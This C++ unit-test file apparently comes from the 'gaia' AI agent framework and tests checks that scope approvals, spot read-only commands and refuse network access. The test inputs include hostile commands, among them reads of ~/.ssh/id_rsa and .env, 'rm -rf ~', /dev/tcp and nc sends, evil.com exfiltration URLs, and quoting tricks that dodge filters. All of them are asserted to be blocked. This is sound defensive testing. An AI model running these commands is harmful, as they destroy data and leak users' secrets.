// Copyright(C) 2025-2026 Advanced Micro Devices, Inc. All rights reserved.
// SPDX-License-Identifier: MIT

#include "support/unique_temp.h"
#include <gtest/gtest.h>
#include <gaia/security.h>
#include <gaia/tool_registry.h>

#include <chrono>
#include <cstdlib>
#include <filesystem>
#include <fstream>
#include <string>

#include <gaia/memory_store.h>
#include <gaia/session.h>

using namespace gaia;
namespace fs = std::filesystem;

// ---------------------------------------------------------------------------
// validatePath
// ---------------------------------------------------------------------------

class ValidatePathTest : public ::testing::Test {
protected:
    fs::path tmpBase;

    void SetUp() override {
        tmpBase = fs::temp_directory_path() / testsupport::perProcess("gaia_pathtest");
        fs::create_directories(tmpBase);
    }

    void TearDown() override {
        fs::remove_all(tmpBase);
    }
};

TEST_F(ValidatePathTest, ValidPathInsideBase) {
    fs::path child = tmpBase / "subdir" / "file.txt";
    fs::create_directories(child.parent_path());
    // Create the file so realpath can resolve it
    { std::ofstream f(child); f << "x"; }
    EXPECT_TRUE(validatePath(tmpBase.string(), child.string()));
}

TEST_F(ValidatePathTest, IdenticalPaths) {
    EXPECT_TRUE(validatePath(tmpBase.string(), tmpBase.string()));
}

TEST_F(ValidatePathTest, PathTraversalBlocked) {
    // Construct a path that uses .. to escape tmpBase
    fs::path escape = tmpBase / ".." / "escape.txt";
    EXPECT_FALSE(validatePath(tmpBase.string(), escape.string()));
}

TEST_F(ValidatePathTest, NonExistentRequestedPath) {
    // realpath requires the path to exist on POSIX; a non-existent path returns false.
    fs::path nonExistent = tmpBase / "does_not_exist.txt";
    EXPECT_FALSE(validatePath(tmpBase.string(), nonExistent.string()));
}

TEST_F(ValidatePathTest, EmptyPaths) {
    EXPECT_FALSE(validatePath("", tmpBase.string()));
    EXPECT_FALSE(validatePath(tmpBase.string(), ""));
    EXPECT_FALSE(validatePath("", ""));
}

// ---------------------------------------------------------------------------
// isSafeShellArg
// ---------------------------------------------------------------------------

TEST(IsSafeShellArgTest, SafeInputsAccepted) {
    EXPECT_TRUE(isSafeShellArg("hello"));
    EXPECT_TRUE(isSafeShellArg("filename.txt"));
    EXPECT_TRUE(isSafeShellArg("CamelCase123"));
    EXPECT_TRUE(isSafeShellArg("dash-ok"));
    EXPECT_TRUE(isSafeShellArg("under_score"));
    EXPECT_TRUE(isSafeShellArg("path/to/file"));
    EXPECT_TRUE(isSafeShellArg("C:\\Windows\\file"));
}

TEST(IsSafeShellArgTest, InjectionCharsRejected) {
    EXPECT_FALSE(isSafeShellArg("hello world"));   // space
    EXPECT_FALSE(isSafeShellArg("cmd;evil"));       // semicolon
    EXPECT_FALSE(isSafeShellArg("a|b"));            // pipe
    EXPECT_FALSE(isSafeShellArg("a&&b"));           // &&
    EXPECT_FALSE(isSafeShellArg("$(evil)"));        // command substitution
    EXPECT_FALSE(isSafeShellArg("`cmd`"));          // backtick
    EXPECT_FALSE(isSafeShellArg("a>out"));          // redirect
    EXPECT_FALSE(isSafeShellArg("<in"));            // redirect
    EXPECT_FALSE(isSafeShellArg("'quoted'"));       // single quote
    EXPECT_FALSE(isSafeShellArg("\"quoted\""));     // double quote
    EXPECT_FALSE(isSafeShellArg("$VAR"));           // variable
}

TEST(IsSafeShellArgTest, EmptyStringRejected) {
    EXPECT_FALSE(isSafeShellArg(""));
}

// ---------------------------------------------------------------------------
// AllowedToolsStore
// ---------------------------------------------------------------------------

class AllowedToolsStoreTest : public ::testing::Test {
protected:
    fs::path storeDir;
    std::unique_ptr<AllowedToolsStore> store;

    void SetUp() override {
        storeDir = fs::temp_directory_path() / testsupport::perProcess("gaia_store_test");
        fs::remove_all(storeDir);
        store = std::make_unique<AllowedToolsStore>(storeDir.string());
    }

    void TearDown() override {
        fs::remove_all(storeDir);
    }
};

TEST_F(AllowedToolsStoreTest, AddAndCheck) {
    EXPECT_FALSE(store->isAlwaysAllowed("read_file"));
    store->addAlwaysAllowed("read_file");
    EXPECT_TRUE(store->isAlwaysAllowed("read_file"));
    EXPECT_FALSE(store->isAlwaysAllowed("other_tool"));
}

TEST_F(AllowedToolsStoreTest, Persistence) {
    store->addAlwaysAllowed("check_adapter");
    store->addAlwaysAllowed("mcp_windows_Shell");

    // Reload from the same directory
    AllowedToolsStore reloaded(storeDir.string());
    EXPECT_TRUE(reloaded.isAlwaysAllowed("check_adapter"));
    EXPECT_TRUE(reloaded.isAlwaysAllowed("mcp_windows_Shell"));
    EXPECT_FALSE(reloaded.isAlwaysAllowed("nonexistent"));
}

TEST_F(AllowedToolsStoreTest, RemoveTool) {
    store->addAlwaysAllowed("tool_a");
    store->addAlwaysAllowed("tool_b");
    store->removeAlwaysAllowed("tool_a");

    EXPECT_FALSE(store->isAlwaysAllowed("tool_a"));
    EXPECT_TRUE(store->isAlwaysAllowed("tool_b"));
}

TEST_F(AllowedToolsStoreTest, ClearAll) {
    store->addAlwaysAllowed("tool_a");
    store->addAlwaysAllowed("tool_b");
    store->clearAll();

    EXPECT_FALSE(store->isAlwaysAllowed("tool_a"));
    EXPECT_FALSE(store->isAlwaysAllowed("tool_b"));
    EXPECT_TRUE(store->allAllowed().empty());

    // Persist of empty list: reload should also be empty
    AllowedToolsStore reloaded(storeDir.string());
    EXPECT_TRUE(reloaded.allAllowed().empty());
}

TEST_F(AllowedToolsStoreTest, CorruptFile) {
    fs::path storeFile = storeDir / "allowed_tools.json";
    { std::ofstream f(storeFile); f << "not valid json {{{{"; }

    // Constructing a store over a corrupt file must not throw; store starts empty.
    AllowedToolsStore reloaded(storeDir.string());
    EXPECT_TRUE(reloaded.allAllowed().empty());
}

TEST_F(AllowedToolsStoreTest, AllAllowed) {
    store->addAlwaysAllowed("tool_b");
    store->addAlwaysAllowed("tool_a");
    auto all = store->allAllowed();
    ASSERT_EQ(all.size(), 2u);
    // std::set returns sorted order
    EXPECT_EQ(all[0], "tool_a");
    EXPECT_EQ(all[1], "tool_b");
}

// ---------------------------------------------------------------------------
// makeStdinConfirmCallback
// ---------------------------------------------------------------------------

TEST(MakeStdinConfirmCallbackTest, ReturnsCallable) {
    gaia::ToolConfirmCallback cb = gaia::makeStdinConfirmCallback();
    EXPECT_TRUE(static_cast<bool>(cb));
}

// ---- shell grant scope ----

TEST(ShellCommandScopeTest, ProgramOrSubcommandOrExact) {
    EXPECT_EQ(shellCommandScope("pytest -q tests/"), "cmd:pytest");
    EXPECT_EQ(shellCommandScope("  ls -la "), "cmd:ls");
    EXPECT_EQ(shellCommandScope("git status"), "cmd:git status");
    EXPECT_NE(shellCommandScope("git push --force"), shellCommandScope("git status"));
    EXPECT_EQ(shellCommandScope("pytest && rm -rf ~"), "exact:pytest && rm -rf ~");
    EXPECT_EQ(shellCommandScope("cat a | sh"), "exact:cat a | sh");
    EXPECT_EQ(shellCommandScope("echo $(whoami)"), "exact:echo $(whoami)");
    EXPECT_EQ(shellCommandScope("python3 -c 'import os'"), "exact:python3 -c 'import os'");
    EXPECT_EQ(shellCommandScope("FOO=1 make"), "exact:FOO=1 make");
    // A wrapper or interpreter runs whatever it is handed, so the grant is for that line only.
    for (const char* line : {"perl script.pl", "env rm x", "xargs rm", "sudo ls", "node build.js",
                             "/usr/bin/ls", "./run.sh", "git -C elsewhere status", "git", "unknown-tool x"}) {
        EXPECT_EQ(shellCommandScope(line), std::string("exact:") + line) << line;
    }
    EXPECT_EQ(shellCommandScope("npm test -- --watch"), "cmd:npm test");
    EXPECT_EQ(shellCommandScope("mkdir -p out"), "cmd:mkdir");
}

TEST(ShellCommandScopeTest, AlwaysAllowCoversOnlyThatCommand) {
    const std::string dir = (std::filesystem::temp_directory_path() / testsupport::perProcess("gaia-grant-scope-test")).string();
    std::filesystem::remove_all(dir);
    auto store = std::make_shared<AllowedToolsStore>(dir);
    ToolRegistry reg;
    reg.setAllowedToolsStore(store);
    ToolInfo sh;
    sh.name = "sh";
    sh.policy = ToolPolicy::CONFIRM;
    sh.parameters = {{"command", ToolParamType::STRING, true, ""}};
    sh.callback = [](const json&) { return json{{"status", "success"}}; };
    sh.grantScope = [](const json& a) { return shellCommandScope(a.value("command", "")); };
    reg.registerTool(sh);

    int asked = 0;
    reg.setConfirmCallback([&asked](const std::string&, const json&) {
        ++asked;
        return asked == 1 ? ToolConfirmResult::ALWAYS_ALLOW : ToolConfirmResult::DENY;
    });
    EXPECT_EQ(reg.executeTool("sh", json{{"command", "pytest -q"}})["status"], "success");
    EXPECT_EQ(reg.executeTool("sh", json{{"command", "pytest -x"}})["status"], "success");
    EXPECT_EQ(asked, 1) << "the same program is approved";
    EXPECT_EQ(reg.executeTool("sh", json{{"command", "rm -rf build"}})["status"], "error");
    EXPECT_EQ(asked, 2) << "a different program is asked about again";
    std::filesystem::remove_all(dir);
}

TEST(ReadOnlyShellCommandTest, OnlyPlainReadersPass) {
    for (const char* ok : {"ls -la", "hostname", "echo 'a & b'", "cat a.txt | grep foo | wc -l",
                           "find . -name '*.md'", "pwd; ls -la", "cd src && ls",
                           "ls cpp 2>/dev/null || echo none", "ls \"C:/Program Files\"",
                           "find . -name 'a;b'", "grep -n 'a..b' notes.txt"}) {
        EXPECT_TRUE(isReadOnlyShellCommand(ok)) << ok;
    }
    for (const char* no : {"", "rm -rf x", "ls; rm x", "ls && rm x", "cat a > b", "echo $HOME",
                           "echo %PATH%", "cat $(which ls)", "find . -delete", "find . -exec rm {} ;",
                           "ls\nrm x", "python -c 1", "ls | sh", "ls ||", "; ls",
                           "ls & rm x", "ls 2> err.txt", "ls >> out", "ls 1>out",
                           // Quoting and escapes the shell removes before find sees the flag.
                           "find . \"-delete\"", "find . -de''lete", "find . -\\delete",
                           "find . '-exec' rm -rf {} +", "find . -fprintf out x", "find . -okdir rm {} ;",
                           // Programs that can write or run code.
                           "sort -ofile in", "uniq in out", "tree -o out", "rg --pre=sh x", "file -C -m x",
                           "git status", "git diff --output=x", "tee out", "xargs rm", "less x",
                           // Unbalanced quotes, subshells, history expansion.
                           "ls 'x", "(rm x)", "echo !!", "ls {a,b}",
                           // bash consumes a backslash, so the word it hides is unknown.
                           "ls \\\"x", "dir C:\\Users\\x", "cat a\\ b",
                           // A quoted program name, another case, a share, a write.
                           "\"ls\" -la", "'cat' x", "LS", "ls //server/share", "cat \\\\server\\share\\x",
                           "hostname newname", "ls 2>nul", "sort x", "awk 1 x", "sed -n p x",
                           // A `..` step can climb out of the chat's folders.
                           "cat ../../../home/u/.ssh/id_rsa", "grep -r key ..", "cd .. && ls", "ls src/../..",
                           "head 'a/../../b'", "cat ..\\x"}) {
        EXPECT_FALSE(isReadOnlyShellCommand(no)) << no;
    }
}

TEST(ReadOnlyShellCommandTest, CmdExeTrustsOnlyBuiltins) {
    // cmd.exe runs find.bat from the current folder before the real find.
    for (const char* ok : {"dir", "DIR", "dir /s /b C:\\x", "dir /s /b C:\\Users\\x\\*.md", "type notes.txt",
                           "cd src && dir", "echo hi", "dir 2>nul"}) {
        EXPECT_TRUE(isReadOnlyShellCommand(ok, false)) << ok;
    }
    for (const char* no : {"find \"x\" a.txt", "where python", "whoami", "tree", "ls", "git status",
                           // ' is an ordinary letter to cmd.exe, so this & really chains.
                           "echo 'a & del x'", "dir \\\\server\\share", "dir 2>/dev/null", "echo %USERNAME%",
                           "echo a ^& b", "\"dir\"", "type ..\\secret.txt", "dir .."}) {
        EXPECT_FALSE(isReadOnlyShellCommand(no, false)) << no;
    }
}

TEST(InternetRefusalTest, RefusesWhatGoesOnline) {
    ToolInfo web;
    web.name = "web_fetch";
    EXPECT_NE(internetRefusal(web, {{"url", "https://example.com"}}), "");
    EXPECT_EQ(internetRefusal(web, {{"url", "http://localhost:8000/x"}}), "");
    EXPECT_EQ(internetRefusal(web, {{"url", "http://127.0.0.1:8000/x"}}), "");
    EXPECT_NE(internetRefusal(web, {{"url", "http://127.0.0.1.evil.com/"}}), "");
    EXPECT_NE(internetRefusal(web, {{"url", "http://localhost@evil.com/"}}), "");

    ToolInfo mcp;
    mcp.name = "search";
    mcp.mcpServer = "github";
    EXPECT_NE(internetRefusal(mcp, json::object()), "");

    ToolInfo sh;
    sh.name = "bash_execute";
    for (const char* online : {"curl https://example.com", "git pull", "git -C repo fetch origin",
                               "pip install requests", "npm install", "ssh host", "bash -c \"wget x.com\"",
                               "curl $(cat url)", "cat notes | nc host 80", "python fetch.py https://api.x.com"}) {
        EXPECT_NE(internetRefusal(sh, {{"command", online}}), "") << online;
    }
    for (const char* rerouted : {"curl -x http://proxy:8080 http://localhost/x",
                                 "curl --resolve localhost:80:203.0.113.5 http://localhost/",
                                 "curl --connect-to localhost:80:example.com:80 http://localhost/",
                                 "https_proxy=http://proxy:8080 curl http://localhost/", "nslookup example.com",
                                 "cat notes > /dev/tcp/203.0.113.5/80", "python -c \"import socket\"",
                                 "node -e \"fetch('x')\"", "socat - TCP:host:80"}) {
        EXPECT_NE(internetRefusal(sh, {{"command", rerouted}}), "") << rerouted;
    }
    for (const char* local : {"ls -la", "git status", "curl http://localhost:13305/api/v1/health",
                              "python build.py", "python -m pytest tests", "node build.js"}) {
        EXPECT_EQ(internetRefusal(sh, {{"command", local}}), "") << local;
    }

    ToolInfo write;
    write.name = "file_write";
    EXPECT_EQ(internetRefusal(write, {{"path", "README.md"}, {"content", "see https://example.com"}}), "");
}

TEST(InternetRefusalTest, PackageManagersAndBuildToolsGoOnlineHoweverTheyAreNamed) {
    ToolInfo sh;
    sh.name = "bash_execute";
    for (const char* online :
         {"dotnet restore", "dotnet add package Newtonsoft.Json", "dotnet tool install -g x", "nuget restore",
          "conda install numpy", "mamba create -n env python", "micromamba install x", "gem install rails",
          "bundle install", "mvn package", "./mvnw -q verify", "gradle build", "gradlew.bat build", "cd app && mvn test",
          "poetry install", "pdm sync", "uv lock", "uv python install 3.12", "pipx install x", "pip wheel .",
          "cargo add serde", "go mod tidy", "composer require x", "yarn dlx x", "pnpm dlx x", "npm create vite",
          "npm init vite", "podman pull x", "zypper install x", "apk add x", "pacman -S x", "Install-Module Az",
          "hf download x", "certutil -urlcache -f http://localhost/a a",
          // A full path, a quoted path, a Windows suffix or another case runs the same program.
          "C:\\tools\\Conda.EXE install x", "\"C:\\Program Files\\dotnet\\dotnet.exe\" restore",
          "/usr/local/bin/pip3 install x", "pip.exe install x", "NPM.CMD install", "CONDA INSTALL x",
          "C:\\Ruby\\bin\\gem.cmd install x", "yarn.cmd add x", "c''onda install x",
          "\"conda\" install x", "echo ok\nmvn -q package"}) {
        EXPECT_NE(internetRefusal(sh, {{"command", online}}), "") << online;
    }
    for (const char* local : {"cat build.gradle", "cat pom.xml", "dotnet build", "dotnet --version", "npm init -y",
                              "npm test", "cargo build", "conda list", "gem list", "pip list", "echo mvnfoo"}) {
        EXPECT_EQ(internetRefusal(sh, {{"command", local}}), "") << local;
    }
}

// The table the Python runtime's tests read too, so both refuse and allow the same commands.
TEST(InternetRefusalTest, SplicedNamesAndOfflineFlagsJudgedAsThePythonAgentDoes) {
    std::ifstream in(fs::path(GAIA_REPO_FIXTURES_DIR) / "offline_commands.json");
    ASSERT_TRUE(in) << "tests/fixtures/offline_commands.json";
    const json table = json::parse(in);
    ToolInfo sh;
    sh.name = "bash_execute";
    ASSERT_FALSE(table["refused"].empty());
    ASSERT_FALSE(table["allowed"].empty());
    ASSERT_FALSE(table["refused_harmless"].empty());
    for (const auto& list : {table["refused"], table["refused_harmless"]}) {
        for (const auto& c : list) {
            EXPECT_NE(internetRefusal(sh, {{"command", c}}), "") << c.get<std::string>();
        }
    }
    for (const auto& c : table["allowed"]) {
        EXPECT_EQ(internetRefusal(sh, {{"command", c}}), "") << c.get<std::string>();
    }
}

TEST(InternetRefusalTest, ARefusalQuotesTheCommandAsAsked) {
    ToolInfo sh;
    sh.name = "bash_execute";
    // The original command is what the refusal quotes, not the copy the check read.
    const std::string why = internetRefusal(sh, {{"command", "mvn -o package && npm install"}});
    EXPECT_NE(why.find("mvn -o package && npm install"), std::string::npos) << why;
}

TEST(WebFetchRefusalTest, RefusesShellFetchesButNotInstallsOrLocalRequests) {
    ToolInfo sh;
    sh.name = "bash_execute";
    for (const char* fetched :
         {"curl -s -L https://example.com", "curl example.com", "wget https://example.com/a.html",
          "cu''rl https://example.com", "bash -c \"wget x.com\"", "curl $(cat url)",
          "Invoke-WebRequest https://example.com", "iwr https://example.com -OutFile a.html",
          "python -c \"import urllib.request; print(urllib.request.urlopen('https://example.com').read())\"",
          "node -e \"fetch('https://example.com')\"", "cat < /dev/tcp/203.0.113.5/80",
          "bitsadmin /transfer j https://example.com/a a", "certutil -urlcache -f https://example.com/a a",
          "curl -x http://proxy:8080 http://localhost/x",
          // Wrapped, chained or named by its full path, it is still the program that runs.
          "bash -c \"curl -s https://example.com\"", "powershell -Command \"iwr https://example.com\"",
          "cmd /c curl https://example.com", "C:\\Tools\\curl.exe https://example.com",
          "echo start && curl https://example.com", "sudo wget https://example.com"}) {
        const std::string why = webFetchRefusal(sh, {{"command", fetched}});
        EXPECT_NE(why.find("Web access is off"), std::string::npos) << fetched << ": " << why;
    }
    // The run may still install what the task needs and talk to this PC.
    for (const char* allowed :
         {"ls -la", "git status", "pip install requests", "npm install", "python build.py",
          "curl http://localhost:13305/api/v1/health", "curl http://127.0.0.1:8000/x", "python -m pytest tests",
          "grep -r curl docs", "cat curl-notes.txt", "git log --grep wget",
          "echo see https://example.com for curl"}) {
        EXPECT_EQ(webFetchRefusal(sh, {{"command", allowed}}), "") << allowed;
    }
    EXPECT_NE(webFetchRefusal(sh, {{"command", "echo " + std::string(300000, 'a')}}), "");
    EXPECT_EQ(webFetchRefusal(sh, {{"command", 7}}), "");

    // Only the shell is judged: the flag withholds web_fetch itself, and connectors stay on.
    ToolInfo mcp;
    mcp.name = "search";
    mcp.mcpServer = "github";
    EXPECT_EQ(webFetchRefusal(mcp, json::object()), "");
    ToolInfo write;
    write.name = "file_write";
    EXPECT_EQ(webFetchRefusal(write, {{"path", "a.md"}, {"content", "curl https://example.com"}}), "");
}

TEST(SplitShellCommandTest, SegmentsAndWords) {
    std::vector<std::vector<std::string>> s;
    ASSERT_TRUE(splitShellCommand("cd src && cat 'a b.txt' | wc -l; ls", true, s));
    ASSERT_EQ(s.size(), 4u);
    EXPECT_EQ(s[0], (std::vector<std::string>{"cd", "src"}));
    EXPECT_EQ(s[1], (std::vector<std::string>{"cat", "a b.txt"}));
    EXPECT_EQ(s[3], (std::vector<std::string>{"ls"}));
    ASSERT_TRUE(splitShellCommand("type it's.txt", false, s)) << "one quote character under cmd.exe";
    EXPECT_EQ(s[0], (std::vector<std::string>{"type", "it's.txt"}));
    for (const char* no : {"ls > out", "ls &", "echo $X", "echo `x`", "ls \"x", "", "ls |", "a\nb"}) {
        EXPECT_FALSE(splitShellCommand(no, true, s)) << no;
    }
}

TEST(AllowedToolsStoreHomeTest, NoHomeIsAnErrorNotASharedFolder) {
#ifdef _WIN32
    const char* name = "USERPROFILE";
#else
    const char* name = "HOME";
#endif
    const char* was = std::getenv(name);
    const std::string saved = was ? was : "";
#ifdef _WIN32
    _putenv_s(name, "");
#else
    unsetenv(name);
#endif
    EXPECT_THROW(AllowedToolsStore{}, std::runtime_error);
#ifdef _WIN32
    _putenv_s(name, saved.c_str());
#else
    if (was) setenv(name, saved.c_str(), 1);
#endif
}

TEST_F(AllowedToolsStoreTest, SaveLeavesNoTemporaryFile) {
    store->addAlwaysAllowed("file_write");
    size_t files = 0;
    for (const auto& e : std::filesystem::directory_iterator(storeDir)) {
        ++files;
        EXPECT_EQ(e.path().extension(), ".json") << e.path();
    }
    EXPECT_EQ(files, 1u);
}

TEST(ReadOnlyShellCommandTest, NeedsConfirmSkipsTheQuestion) {
    ToolRegistry reg;
    ToolInfo sh;
    sh.name = "sh";
    sh.policy = ToolPolicy::CONFIRM;
    sh.parameters = {{"command", ToolParamType::STRING, true, ""}};
    sh.callback = [](const json&) { return json{{"status", "success"}}; };
    sh.needsConfirm = [](const json& a) { return !isReadOnlyShellCommand(a.value("command", "")); };
    reg.registerTool(sh);
    int asked = 0;
    reg.setConfirmCallback([&asked](const std::string&, const json&) {
        ++asked;
        return ToolConfirmResult::DENY;
    });
    EXPECT_EQ(reg.executeTool("sh", json{{"command", "ls -la"}})["status"], "success");
    EXPECT_EQ(asked, 0);
    EXPECT_EQ(reg.executeTool("sh", json{{"command", "rm -rf build"}})["status"], "error");
    EXPECT_EQ(asked, 1);
}

// GAIA_HOME moves every per-user file, not only some of them.
TEST(GaiaHomeTest, ApprovalsSessionsAndMemoryAllFollowGaiaHome) {
    const std::filesystem::path home =
        std::filesystem::temp_directory_path() /
        ("gaia-home-" + std::to_string(std::chrono::steady_clock::now().time_since_epoch().count()));
    std::filesystem::create_directories(home);
    const char* was = std::getenv("GAIA_HOME");
    const std::string saved = was ? was : "";
#ifdef _WIN32
    _putenv_s("GAIA_HOME", home.string().c_str());
#else
    setenv("GAIA_HOME", home.string().c_str(), 1);
#endif
    const std::string resolved = gaiaHome();
    bool approvals = false, sessions = false;
    std::string memory;
    {
        AllowedToolsStore store;
        store.addAlwaysAllowed("some_tool");
        approvals = std::filesystem::exists(home / "security" / "allowed_tools.json");
        SessionStore chats;
        chats.save("first", {});
        sessions = std::filesystem::exists(home / "sessions") && !std::filesystem::is_empty(home / "sessions");
        memory = MemoryStore::defaultPath();
    }
#ifdef _WIN32
    _putenv_s("GAIA_HOME", saved.c_str());
#else
    if (was) setenv("GAIA_HOME", saved.c_str(), 1);
    else unsetenv("GAIA_HOME");
#endif
    EXPECT_EQ(resolved, home.string());
    EXPECT_TRUE(approvals) << "saved approvals went somewhere else";
    EXPECT_TRUE(sessions) << "saved sessions went somewhere else";
    EXPECT_EQ(std::filesystem::path(memory).parent_path(), home);
    EXPECT_NE(gaiaHome(), home.string()) << "and without GAIA_HOME it is the home folder's .gaia again";
    std::error_code ec;
    std::filesystem::remove_all(home, ec);
}

TEST(ShellCommandScopeTest, AFlagThatRunsOrWritesIsApprovedOnlyAsWritten) {
    for (const char* line : {"rg --pre ./run.sh needle", "rg --pre=./run.sh needle", "sort -o /etc/hosts in.txt",
                             "sort -uo out.txt in.txt", "sort --output=out.txt in.txt", "sort --out=out.txt in.txt",
                             "sort --compress-program=./run.sh big.txt", "tree -o listing.txt",
                             "cmake -P script.cmake", "cmake -E env ./run.sh"}) {
        EXPECT_EQ(shellCommandScope(line), std::string("exact:") + line) << line;
    }
    EXPECT_EQ(shellCommandScope("rg -n needle src"), "cmd:rg");
    EXPECT_EQ(shellCommandScope("sort -u -k2 in.txt"), "cmd:sort");
    EXPECT_EQ(shellCommandScope("tree -L 2"), "cmd:tree");
    EXPECT_EQ(shellCommandScope("cmake --build build"), "cmd:cmake");
}

TEST(InternetRefusalTest, AnOverlongCommandIsRefusedBeforeItIsScanned) {
    ToolInfo sh;
    sh.name = "bash_execute";
    const std::string refused = internetRefusal(sh, {{"command", "echo " + std::string(300000, 'a')}});
    EXPECT_NE(refused.find("65536"), std::string::npos) << refused.substr(0, 200);
    EXPECT_EQ(internetRefusal(sh, {{"command", "echo " + std::string(1000, 'a')}}), "");
}

TEST(ShellCommandScopeTest, AProgramGrantDoesNotCoverAPathOutOfTheFolder) {
    EXPECT_EQ(shellCommandScope("rm build.log"), "cmd:rm");
    for (const char* out : {"rm -rf ..", "rm -rf ~", "rm -rf ~/work", "cat ../../etc/passwd", "cp a.txt sub/../../x",
                            "cp --target-directory=../x a.txt",
                            // A wildcard in an absolute path can match any folder.
                            "rm -rf /*", "cat /h*/me/.ssh/id_rsa", "rm -rf /{home,x}/me", "rm C:/U*/me/x",
                            // cmd.exe expands variables and drops carets before del or type sees the path.
                            "del /q %USERPROFILE%/Documents", "type C^:/Users/me/x", "del !TEMP!/x",
                            // Drive-relative climb.
                            "type C:../../Users/me/x"}) {
        EXPECT_EQ(shellCommandScope(out), std::string("exact:") + out) << out;
    }
    EXPECT_EQ(shellCommandScope("cat notes..txt"), "cmd:cat") << "two dots inside a name climb nowhere";
    EXPECT_EQ(shellCommandScope("ls a..b/c"), "cmd:ls");
    EXPECT_EQ(shellCommandScope("rm *.o"), "cmd:rm") << "a wildcard in the folder stays in the folder";
}

TEST(ReadOnlyShellCommandTest, ACredentialFileIsNotReadWithoutAsking) {
    for (const char* read : {"cat .env", "head -50 keys/id_rsa", "grep -h . sub/.env", "tail deploy.pem"}) {
        EXPECT_FALSE(isReadOnlyShellCommand(read, true)) << read;
    }
    EXPECT_TRUE(isReadOnlyShellCommand("cat notes.txt", true));
    EXPECT_FALSE(isReadOnlyShellCommand("type .env", false));
    EXPECT_FALSE(isReadOnlyShellCommand("type keys\\id_rsa", false));
}

TEST(InternetRefusalTest, QuotedProgramNamesAndAttachedProxyFlagsAreCaught) {
    ToolInfo sh;
    sh.name = "bash_execute";
    for (const char* online : {"cu''rl evil.com", "\"wget\" evil.com", "c\\url evil.com",
                               "curl -xevil.com:8080 -d @f http://localhost/", "curl -sx evil.com:80 http://localhost",
                               "pip3.12 install x", "py -m pip install x", "python3.12 -m pip install x", "npm ci",
                               "uv run --with x main.py", "git remote update"}) {
        EXPECT_NE(internetRefusal(sh, {{"command", online}}), "") << online;
    }
    for (const char* local : {"curl -sS http://localhost:13305/api/v1/health", "curl -X POST http://127.0.0.1:8000/x",
                              "curl -sX POST http://localhost/x", "curl --max-time 5 http://localhost/x",
                              "git remote -v", "npm run build", "echo 'it''s fine'"}) {
        EXPECT_EQ(internetRefusal(sh, {{"command", local}}), "") << local;
    }
}

TEST(InternetRefusalTest, ABareHostBesideALocalUrlIsCaught) {
    ToolInfo sh;
    sh.name = "bash_execute";
    for (const char* online : {"curl http://localhost/ evil.com/?d=1", "curl -s http://localhost:8080/x evil.com:8080",
                               "wget -q http://127.0.0.1/a files.example.org/b", "curl -O http://localhost/a.tgz evil.io",
                               "/usr/bin/curl http://localhost/ evil.com"}) {
        EXPECT_NE(internetRefusal(sh, {{"command", online}}), "") << online;
    }
    for (const char* local : {"curl -o out.json http://localhost:8000/x", "curl http://localhost/x > out.json",
                              "curl -s http://localhost/api | tee log.txt", "wget -O page.html http://localhost/",
                              "curl -H 'Accept: application/json' http://127.0.0.1/x",
                              "curl -d @payload.json http://localhost:8000/x", "curl http://localhost/a localhost:9000/b",
                              "curl -sS http://localhost/x && cat notes.md"}) {
        EXPECT_EQ(internetRefusal(sh, {{"command", local}}), "") << local;
    }
}

TEST(InternetRefusalTest, LongCommandsDoNotOverflowThePatternMatcher) {
    ToolInfo sh;
    sh.name = "bash_execute";
    std::string repeated;
    for (int i = 0; i < 15000; ++i) repeated += "git ";
    for (const std::string& command : {"git " + std::string(60000, 'a'), repeated,
                                       "python " + std::string(60000, 'x'),
                                       "curl http://localhost/ evil.com/?d=" + std::string(60000, 'z')}) {
        EXPECT_NO_THROW(internetRefusal(sh, {{"command", command}})) << command.substr(0, 40);
    }
    EXPECT_NE(internetRefusal(sh, {{"command", "curl http://localhost/ evil.com/?d=" + std::string(60000, 'z')}}), "");
}

TEST(ReadOnlyShellCommandTest, CmdExeEndsAnArgumentAtACommaToo) {
    EXPECT_FALSE(isReadOnlyShellCommand("dir ..,", false));
    EXPECT_FALSE(isReadOnlyShellCommand("dir ..;sub", false));
    EXPECT_TRUE(isReadOnlyShellCommand("dir sub", false));
}
